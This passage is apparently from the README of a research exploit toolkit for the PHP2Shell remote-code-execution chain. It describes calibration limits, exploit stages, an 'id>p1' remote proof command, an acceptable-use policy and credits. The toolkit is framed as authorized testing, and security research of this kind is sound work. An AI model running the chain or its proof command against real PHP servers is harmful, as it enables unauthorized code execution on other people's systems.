- **Per-build offsets.** A profile is tied to a `libphp.so` build; the same
  version from another distribution, architecture, or even a different
  checkout path (the compile-time prefix shifts the heap) needs its own
  `calibrate` run — the FPM leak geometry in particular is
  environment-specific.
- **`display_errors=Off` is not complete.** The OOM-in-cookie primitive is
  reproducible in research, but the stage-1 leak is not shipped for that
  configuration.
- **`expose_php=Off` changes stage 3.** Hiding `X-Powered-By` shifts the startup
  heap; the known stage-3 pads do not fit and a dedicated calibration is needed.
- **8.3.0** has UAF preconditions but no verified stage 3.
- **8.4.25** is probabilistic; use the default retries.
- **Remote proof is not guaranteed.** `id>p1` only works if the webroot is
  writable and the file is served at `/p1`.
- **HTTPS transport is experimental.** The verified runs use HTTP. The chain's
  HTTPS path did not reproduce stage 1 against direct Apache SSL or proxied labs
  in testing, even though SNI and the unverified context are applied. Treat
  remote HTTPS as unverified until a native end-to-end proof exists.

## Documentation

- [Technical analysis](docs/php2shell-analysis.md)
- [PHP-FPM chain](docs/fpm-chain.md)
- [RCE guide and profile schema](docs/rce-guide.md)
- [Laboratory results](docs/exploit-report.md)
- [Laboratories](docs/labs.md)
- [Safe OOM laboratory](docs/safe-lab.md)
- [Profile inventory](docs/profile-inventory.md)
- [Offset inventory](docs/offset-inventory.md)
- [Coverage roadmap](docs/inventory-growth.md)
- [Per-branch notes](docs/branch-notes.md)
- [Instrumentation](docs/instrumentation/README.md)
- [Reproducibility](docs/reproducibility.md)
- [Contributing](CONTRIBUTING.md)
- [Acceptable use](ACCEPTABLE_USE.md)
- [Upstream changes](docs/upstream-changes.md)
- [Licensing](docs/licensing.md)

## Ethics and acceptable use

This project exists for authorized security testing, defensive validation and
reproducible research. The full policy is in
[ACCEPTABLE_USE.md](ACCEPTABLE_USE.md).

- Do not use it against systems you do not own or have written permission to
  test. A public website is not a laboratory.
- Do not use the remote worker-saturation mode against third-party
  infrastructure; it is intrusive.
- Do not build or distribute target lists, mass-exploitation tooling or
  infrastructure for denial of service.
- Respect the law and the terms of any program you participate in.
- If you find a new affected build, prefer coordinated disclosure with the
  vendor and the PHP security team.

The authors accept no liability for misuse or damage. The license does not grant
authorization to test any system.

## Contributing

Contributions are welcome when they improve reproducibility. Read
[CONTRIBUTING.md](CONTRIBUTING.md) for the profile workflow, tests and the pull
request checklist.

Examples:

- new build profiles with a real proof and the exact image/tag;
- laboratory fixes, offset extraction for new distros/architectures;
- documentation, detection guidance and defensive tooling;
- calibration improvements for the open configurations
  (`display_errors=Off`, `expose_php=Off`, FPM).

Please do not include real target data, credentials, or logs from systems you do
not own. Open an issue or a pull request with the profile, the evidence and the
commands used.

Run the suite before opening a pull request:

```sh
python3 -m unittest discover -s tests -v
```

## Credits

- **Wiz Research** — discovery and public analysis of PHP2Shell
  (CVE-2026-109618 / CVE-2026-109619):
  [blog](https://www.wiz.io/blog/php2shell-php-rce) and
  [technical video](https://youtu.be/H7JWNiQpaT8). The analysis in this
  repository starts from that publication.
- **Calif** — parallel research and the upload-metadata amplification analysis
  referenced in [docs/php2shell-analysis.md](docs/php2shell-analysis.md):
  [calif.io/php2shell](https://calif.io/php2shell/).
- **9bie** — original public PHP2Shell exploit and heap-grooming research:
  stage-1/2 leaks, the stage-3 fake HashTable carrier and the
  [php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
  codebase. The upstream is fetched by `tools/bootstrap_upstream.py` and the
  runtime changes are documented in
  [docs/upstream-changes.md](docs/upstream-changes.md).
- **Karasawa2025** — public research on the `display_errors=Off` direction:
  the OOM-in-cookie primitive, page-level grooming and the alternative leak
  strategy that this repository is still calibrating.
- **WoYinDao** — public CVE-2026-109618 analysis: session lifecycle, the
  pre-RINIT OOM window, the `var_destroy` reentry UAF and the cross-branch
  negative matrix.
- **PHP security team, PHP Foundation and release maintainers** — advisory,
  fixes in 8.4.27, 8.5.12 and the branch releases, and the security release
  notes at [php.net/security](https://www.php.net/security/), with the
  [PHP Foundation note](https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/).
- **devploit** — version-aware dispatcher, profile factory, laboratories,
  instrumentation, tests and documentation.

This toolkit does not claim discovery of the CVE. If a credit is missing or
inaccurate, please open an issue.

## License

MIT for the original code. See [LICENSE](LICENSE) and
[docs/licensing.md](docs/licensing.md) for the upstream boundary. The license
grants copyright permissions only; it does not authorize testing any system.
